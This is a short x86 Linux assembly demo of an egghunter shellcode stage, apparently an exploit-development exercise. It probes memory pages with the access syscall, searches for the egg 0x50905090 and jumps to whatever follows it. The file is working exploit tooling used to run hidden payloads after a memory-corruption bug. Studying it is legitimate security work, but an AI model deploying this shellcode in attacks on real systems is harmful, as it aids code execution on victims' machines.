; Egghunter Demo - With Action syscall
; SLAER

global _start:

section .text

_start:
	
	; Cleaup
	xor ebx, ebx
	mul ebx
	mov edi, ebx

	;setting up page frame
fsetup:
	or dx, 0xfff

next_frame:
	inc edx
	lea ebx, [edx+0x4]
	push byte 0x21
	pop ax 
	int 0x80
	test al, 0xf2
	jz fsetup

	; Moving egg to eax if frame is correct
	
	mov eax, 0x50905090
	mov edi, edx
	scasd
	jnz next_frame
	scasd
	jnz next_frame
	jmp edi
	

